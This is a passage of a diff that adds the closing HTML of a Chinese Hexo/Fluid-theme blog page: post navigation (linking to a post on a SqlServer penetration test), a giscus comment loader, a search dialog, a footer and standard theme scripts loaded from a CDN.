+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/11/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/%E4%B8%80%E6%AC%A1%E9%92%88%E5%AF%B9SqlServer%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="一次针对SqlServer的渗透测试">
+                        <span class="hidden-mobile">一次针对SqlServer的渗透测试</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Sp4rks3/Sp4rks3.github.io","repo-id":"R_kgDOL2R4Xw","category":"Announcements","category-id":"DIC_kwDOL2R4X84ChqtT","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
